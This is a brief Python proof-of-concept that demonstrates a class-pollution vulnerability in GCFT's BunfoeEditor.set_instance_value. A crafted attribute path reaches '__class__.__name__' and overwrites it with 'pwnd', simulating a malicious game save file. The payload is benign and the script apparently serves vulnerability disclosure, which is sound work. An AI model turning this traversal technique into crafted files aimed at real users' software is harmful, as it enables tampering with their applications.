# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: BunfoeEditor.set_instance_value (via game file)
# Type: get-attr-set-attr
# Trigger: Opening a malicious game save file in GCFT GUI
#
# GCFT (GameCube File Tools) uses BunfoeEditor.set_instance_value to apply
# edits from save files. A crafted save file with malicious attribute paths
# triggers class pollution when the file is opened in the GUI.

import sys
import types

# Mock Qt dependencies
for mod in ['qtpy', 'qtpy.QtGui', 'qtpy.QtCore', 'qtpy.QtWidgets',
            'gclib', 'gclib.bunfoe', 'gclib.fs_helpers', 'gclib.bunfoe_types']:
    sys.modules[mod] = types.ModuleType(mod)

sys.modules['qtpy.QtWidgets'].QWidget = type('QWidget', (), {'__init__': lambda self, *a, **k: None})

from gcft_ui.bunfoe_editor import BunfoeEditor

class Target: pass
target = Target()

editor = BunfoeEditor.__new__(BunfoeEditor)

payload_value = "pwnd"
# Simulates a malicious save file entry with attribute traversal path
PAYLOAD = [("attr", "__class__"), ("attr", "__name__")]

def run_poc():
  editor.set_instance_value(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
